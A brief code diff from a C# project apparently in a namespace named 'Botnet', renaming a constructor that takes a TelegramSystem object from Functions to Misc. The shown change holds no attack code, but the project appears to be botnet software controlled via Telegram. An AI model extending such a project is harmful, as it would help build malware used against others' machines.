@@ -15,7 +15,7 @@ namespace Botnet
     {
         TelegramSystem ts;
 
-        public Functions(TelegramSystem ts)
+        public Misc(TelegramSystem ts)
         {
             this.ts = ts;
         }
